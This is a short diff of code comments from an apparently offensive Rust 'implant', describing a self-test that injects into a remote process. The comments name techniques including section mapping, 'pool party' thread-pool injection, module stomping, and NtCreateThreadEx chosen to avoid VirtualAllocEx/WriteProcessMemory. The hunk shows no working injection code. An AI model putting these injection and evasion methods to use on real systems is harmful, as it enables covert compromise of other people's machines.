@@ -526,8 +526,8 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
 // calls do_inject(method=0) so the section create→map→write→TP_DIRECT path runs
 // against a real process. bit0 = section delivery path ran without panic,
 // bit1 = pool_party_inject returned Ok (full 0-of-3 FND), bit2 = degraded to
-// module_stomp (honest: section delivery OK but worker-queue splice needs more
-// target-side validation — see tp.rs TODO).
+// worker-queue splice (P5-final); current path uses section-backed
+// NtCreateThreadEx which avoids VirtualAllocEx/WriteProcessMemory.
 // ⚠️ This opens a remote process + maps a section into it; a bug here may crash
 // the implant or the target (user-mode). Gate is forced ON for this selftest
 // regardless of NYX_POOL_PARTY_ON build-time default.
